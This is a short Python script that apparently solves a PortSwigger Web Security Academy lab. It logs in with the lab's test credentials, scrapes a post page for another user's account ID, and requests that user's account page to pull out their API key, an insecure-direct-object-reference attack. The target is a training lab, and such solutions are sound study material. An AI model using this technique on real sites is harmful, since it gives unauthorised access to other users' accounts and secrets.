import requests
import re
from bs4 import BeautifulSoup

url = "https://ac231fa91f1cdbb0c0f15a0100c300a4.web-security-academy.net"

def get_id(url):
	r = requests.get(url + "/post?postId=6")
	soup = BeautifulSoup(r.text, 'html.parser')
	for i in soup.find_all('a'):
		if i.get_text() == "carlos":
			id_carlos = i.get('href')
	return id_carlos[14:]

def slove(url):
	s = requests.session()
	data = {"username": "wiener", "password": "peter"}
	r = s.post(url + "/login", data=data)

	exploit = s.get(url + "/my-account/?id=" + get_id(url))
	api = re.findall("Your API Key is: \w+", exploit.text)
	print(api)
slove(url)
